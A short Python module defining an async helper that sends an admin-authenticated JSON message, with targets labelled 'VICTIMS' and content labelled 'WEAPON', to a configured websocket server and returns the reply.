from orjson import dumps
from .config import Config
from websockets.asyncio.client import connect


async def send_admin_ws(victims: list | str, payload: dict | str):
    if isinstance(victims, str) and victims != "ALL":
        raise Exception("Invalid victims")

    headers = {
        "WS-ADMIN-KEY": Config.WS_ADMIN_KEY,
        "WS-ADMIN-VERIFY": Config.WS_ADMIN_VERIFY,
    }
    url = Config.WS_LINK
    async with connect(url, additional_headers=headers) as websocket:
        request = dumps({"ADMIN-SAYS": {"VICTIMS": victims, "WEAPON": payload}})
        await websocket.send(request.decode())
        response = await websocket.recv()
        print(response)
        return response
